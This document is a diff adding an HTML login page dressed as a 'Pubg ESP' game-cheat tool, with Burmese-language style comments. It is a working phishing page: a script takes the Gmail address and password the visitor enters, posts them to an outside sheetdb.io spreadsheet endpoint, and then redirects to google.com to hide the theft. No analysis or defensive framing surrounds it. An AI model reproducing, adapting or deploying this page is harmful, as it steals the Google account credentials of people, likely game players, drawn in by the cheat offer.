@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-image: url('background.jpg'); /* အနောက်ခံပုံ */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.9); /* အနည်းငယ်ထည့်ထားတဲ့ အဖြူရောင် */
+            width: 300px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin-bottom: 15px;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #FFD700; /* ရွှေရောင် */
+            font-weight: bold;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .login-container button:hover {
+            background-color: #45a049;
+        }
+        .login-container p {
+            margin-top: 10px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="pubg.png" alt="Profile Picture">
+        <h2>Pubg ESP</h2>
+        <form id="sheetdb-form" method="POST" action="https://sheetdb.io/api/v1/vladsnssd27a5">
+         <input type="text" placeholder="Gmail" name="data[gmail]" required>
+            <input type="password" placeholder="Password" name="data[pass]" required>
+            <button type="submit">Login</button>
+        </form>
+        <p>Forgot your password?</p>
+    </div>
+
+    <script>
+        document.getElementById('sheetdb-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent the default form submission
+
+            // Send data to the API
+            fetch(this.action, {
+                method: "POST",
+                body: new FormData(this), // Use FormData to send form data
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data); // Log success response (optional)
+
+                // Redirect to Google after successful submission
+                window.location.href = 'https://google.com';
+            })
+            .catch((error) => {
+                console.error('Error:', error); // Log any errors (optional)
+            });
+        });
+    </script>
+</body>
+</html>
